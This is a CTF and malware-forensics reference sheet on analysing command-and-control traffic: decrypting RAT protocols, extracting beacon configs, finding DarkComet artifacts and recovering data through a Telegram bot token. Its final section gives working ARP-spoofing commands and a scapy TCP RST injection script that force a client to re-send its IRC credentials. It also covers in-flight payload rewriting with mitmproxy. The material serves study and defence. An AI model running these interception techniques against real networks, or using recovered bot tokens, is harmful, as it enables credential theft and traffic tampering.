# C2 Traffic and Protocol Analysis

## Table of Contents
- [PCAP Analysis](#pcap-analysis)
- [Custom Crypto Protocols](#custom-crypto-protocols)
- [C2 Traffic Patterns](#c2-traffic-patterns)
- [Network Indicators](#network-indicators)
- [RC4-Encrypted WebSocket C2 Traffic](#rc4-encrypted-websocket-c2-traffic)
- [Password Rotation in C2](#password-rotation-in-c2)
- [AES-CBC in Malware](#aes-cbc-in-malware)
- [Identifying Encryption Algorithms](#identifying-encryption-algorithms)
- [Telegram Bot API for Evidence Recovery](#telegram-bot-api-for-evidence-recovery)
- [Poison Ivy RAT Traffic Decryption (Trend Micro CTF 2015)](#poison-ivy-rat-traffic-decryption-trend-micro-ctf-2015)
- [DarkComet RAT Forensics (CrewCTF 2023)](#darkcomet-rat-forensics-crewctf-2023)
- [Cobalt Strike Beacon Analysis in PCAP (FireShell CTF 2020)](#cobalt-strike-beacon-analysis-in-pcap-fireshell-ctf-2020)
- [ARP Spoof + TCP RST Injection to Capture IRC C2 Creds (TAMUctf 2019)](#arp-spoof--tcp-rst-injection-to-capture-irc-c2-creds-tamuctf-2019)

---

## PCAP Analysis

```bash
tshark -r file.pcap -Y "tcp.stream eq X" -T fields -e tcp.payload
```
Look for C2 communication patterns on unusual ports (e.g., port 21 not for FTP).

## Custom Crypto Protocols

- Stream ciphers may share keystream state for both directions
- Concatenate ALL payloads chronologically before decryption
- Look for hardcoded keys in `.rodata`
- **ChaCha20 keystream extraction:** Send large nullbytes payload (0 XOR anything = anything)
- Alternative: Pipe ciphertext from pcap directly into the binary

## C2 Traffic Patterns

- Beaconing: regular intervals
- Domain generation algorithms (DGA)
- Encoded/encrypted payloads
- HTTP(S) with custom headers
- DNS tunneling

## Network Indicators

```bash
# Extract IPs/domains
strings malware | grep -E '[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}'
strings malware | grep -E '[a-zA-Z0-9.-]+\.(com|net|org|io)'

# DNS queries
tshark -r capture.pcap -Y "dns.qry.name" -T fields -e dns.qry.name | sort -u
```

## RC4-Encrypted WebSocket C2 Traffic

**Pattern (Tampered Seal):** Malware uses WSS over non-standard port with RC4 encryption.

**Decryption workflow:**
1. Identify C2 port from malware source (not standard 443)
2. Remap port with `tcprewrite` so Wireshark decodes TLS
3. Add RSA key for TLS decryption -> reveals WebSocket frames
4. Find RC4 key hardcoded in malware binary
5. Decrypt each WebSocket payload with RC4 via CyberChef

**Malware communication patterns:**
- Registration message: hostname, OS, username, privileges
- Exfiltration: screenshots, keylog data, file contents
- Commands: reverse shell, file download, process list

## Password Rotation in C2

**Pattern:** C2 uses rotating passwords based on time/sequence

**Analysis:**
1. Find password generation function
2. Identify rotation trigger (time-based, message count)
3. Sync your decryptor with the rotation

```python
def get_current_password(timestamp):
    # Password changes every hour
    hour_bucket = timestamp // 3600
    return hashlib.sha256(f"seed_{hour_bucket}".encode()).digest()
```

## AES-CBC in Malware

**Common key derivation:**
- MD5/SHA256 of hardcoded string
- Derived from timestamp or PID
- Password-based (PBKDF2)

**Analysis approach:**
```python
from Crypto.Cipher import AES
from Crypto.Util.Padding import unpad
import hashlib

# Common pattern: key = MD5(password)
password = b"hardcoded_password"
key = hashlib.md5(password).digest()

# IV often first 16 bytes of ciphertext
iv = ciphertext[:16]
ct = ciphertext[16:]

cipher = AES.new(key, AES.MODE_CBC, iv)
plaintext = unpad(cipher.decrypt(ct), 16)
```

## Identifying Encryption Algorithms

**By constants:**
- AES: `0x637c777b`, `0x63636363` (S-box)
- ChaCha20: `expand 32-byte k` or `0x61707865`
- RC4: Sequential S-box initialization
- TEA/XTEA: `0x9E3779B9` (golden ratio)

**By structure:**
- Block cipher: Fixed-size blocks, padding
- Stream cipher: Byte-by-byte, no padding
- Hash: Mixing functions, rounds, constants

## Telegram Bot API for Evidence Recovery

**Pattern (Stomaker):** Malware uses Telegram bot to exfiltrate stolen data.

**Recover exfiltrated data via bot token:**
```python
# If you have the bot API token from malware source:
import requests

TOKEN = "bot_token_here"
# Get updates (message history)
r = requests.get(f"https://api.telegram.org/bot{TOKEN}/getUpdates")
# Download files sent to bot
file_id = "..."
r = requests.get(f"https://api.telegram.org/bot{TOKEN}/getFile?file_id={file_id}")
file_path = r.json()['result']['file_path']
requests.get(f"https://api.telegram.org/file/bot{TOKEN}/{file_path}")
```

---

## Poison Ivy RAT Traffic Decryption (Trend Micro CTF 2015)

**Pattern:** PCAP contains Poison Ivy RAT (Remote Access Trojan) traffic. Poison Ivy uses Camellia cipher with the key derived from an attacker-supplied password (null-padded to key length). The default password is "admin".

```bash
# Decrypt using MITRE's ChopShop framework + FireEye Poison Ivy module
chopshop -f capture.pcap -s ./output/ "poisonivy_23x -c -w admin"
```

**Identification:**
- Traffic to non-standard ports (often 3460, 65535)
- Initial handshake with 256-byte key exchange
- Encrypted data blocks with 8-byte aligned lengths

**Alternative decryption (Python):**
```python
from Crypto.Cipher import Camellia

password = b"admin"
key = password.ljust(32, b'\x00')[:32]  # null-pad to 256 bits
cipher = Camellia.new(key, Camellia.MODE_ECB)
plaintext = cipher.decrypt(encrypted_data)
```

**Key insight:** Poison Ivy's encryption key is derived solely from the attacker password with null-byte padding — no key derivation function. The default password "admin" is commonly left unchanged. ChopShop with `poisonivy_23x` module automates full session reconstruction (screenshots, file listings, keystrokes). Also try common passwords: "password", "p0ison", or challenge-provided hints.

---

## DarkComet RAT Forensics (CrewCTF 2023)

Identify and analyze DarkComet RAT artifacts in memory dumps and disk images.

```bash
# DarkComet keylogger log locations:
# %APPDATA%/dclogs/YYYY-MM-DD-N.dc
# Format: plaintext with window titles and keystrokes

# Volatility: find DarkComet artifacts
volatility3 -f memory.dmp windows.filescan | grep -i dclogs
volatility3 -f memory.dmp windows.filescan | grep -i "\.dc$"

# Dump the keylogger files
volatility3 -f memory.dmp windows.dumpfiles --dump-dir=output -Q <physical_address>

# DarkComet persistence:
# Registry: HKCU\Software\Microsoft\Windows\CurrentVersion\Run
# Points to: rundll32.exe wrapper or direct executable
# Check with:
volatility3 -f memory.dmp windows.registry.printkey --key "Software\Microsoft\Windows\CurrentVersion\Run"

# DarkComet network indicators:
# Default port: 1604
# Mutex: typically "DarkComet" or custom string
# Process: often injects into legitimate process (svchost.exe, explorer.exe)
volatility3 -f memory.dmp windows.netscan | grep 1604
```

**Key insight:** DarkComet stores offline keylogger data in `.dc` files under `%APPDATA%/dclogs/` with date-stamped filenames. These survive in memory dumps and can be carved with Volatility's filescan + dumpfiles. Check the Run registry key for persistence mechanisms.

---

## Cobalt Strike Beacon Analysis in PCAP (FireShell CTF 2020)

Detect and decode Cobalt Strike beacon traffic from network captures.

```bash
# Cobalt Strike beacon indicators in PCAP:
# - HTTP GET/POST to /submit.php, /pixel, /__utm.gif, /ca, /dpixel (default URIs)
# - Cookie contains base64-encoded metadata
# - Regular check-in intervals (default: 60s sleep)
# - User-Agent matches common Malleable C2 profiles

# Wireshark filters for CS traffic:
# http.request.uri contains "submit.php" or http.request.uri contains "__utm"
# http.cookie contains base64 pattern

# Decode beacon config from captured DLL/shellcode:
# pip install dissect.cobaltstrike
python3 -c "
from dissect.cobaltstrike import beacon
for config in beacon.iter_beacons(open('beacon.bin', 'rb')):
    print(config)
    # Shows: C2 server, sleep time, jitter, URI paths, user-agent, watermark
"

# Extract beacon from PCAP:
tshark -r capture.pcap -Y "http.response" -T fields -e http.file_data | xxd -r -p > payload.bin
# Then analyze with dissect.cobaltstrike or CobaltStrikeParser
```

**Key insight:** Cobalt Strike uses "Malleable C2" profiles that customize HTTP indicators, but the underlying beacon protocol structure is consistent. Look for regular-interval HTTP requests with encoded cookies/parameters. The `dissect.cobaltstrike` Python library can extract full beacon configs from captured payloads.

---

## ARP Spoof + TCP RST Injection to Capture IRC C2 Creds (TAMUctf 2019)

**Pattern (Alt-F4 for Ops):** CTF network looks empty (nmap on `172.30.0.0/28` shows only a gateway at `.1` and one peer at `.2`), but the gateway routes to a hidden IRC C2 server (`172.30.20.10`). Legitimate clients connect with a `PASS` command we never get to see. Mount a classic MITM:

```bash
# 1. Poison the LAN so .2's traffic to .1 flows through our box
sudo arpspoof -i tap0 -r -t 172.30.0.2 172.30.0.1

# 2. Route the hidden subnet through the spoofed gateway
sudo route add -net 172.30.20.0/28 gw 172.30.0.1 dev tap0

# 3. Wireshark / tcpdump reveals the IRC server, but we land mid-session
#    (no PASS captured). Force a reconnect by spoofing a TCP RST.
```

Use scapy to forge a RST into the live stream so the client reconnects and re-sends `PASS`:

```python
from scapy.all import sniff, send, IP, TCP
VICTIM, SERVER = "172.30.0.2", "172.30.20.10"

def kill(p):
    if p.haslayer(TCP) and p[IP].src == VICTIM and p[TCP].dport == 6667:
        rst = IP(src=SERVER, dst=VICTIM) / TCP(
            sport=6667, dport=p[TCP].sport,
            seq=p[TCP].ack, flags="R")
        send(rst, verbose=0)

sniff(iface="tap0", filter=f"host {SERVER} and tcp port 6667", prn=kill)
```

A few seconds later the intercepted stream contains `PASS underling` and `JOIN #void`. Same technique run from a pivot bot recovers the server-operator secret (`OPER baal darksecret`). For inline payload rewriting, mitmproxy's `rawtcp.py` layer can be edited directly to drop `buf = buf.replace(b'old', b'new')` inside the TCP relay, giving arbitrary protocol MITM without an HTTP plugin.

**Key insight:** Non-HTTP C2 (IRC, custom TCP) defeats `mitmproxy --mode transparent` defaults, but ARP spoofing plus forged RSTs turn any long-lived TCP session into a replayable handshake — you do not need to crack the auth, you just force the client to perform it again in front of you. Combine with mitmproxy raw-TCP source edits for in-flight payload substitution when you need to stay invisible to both endpoints.

**References:** TAMUctf 2019 — Alt-F4 for Ops, writeup 13478
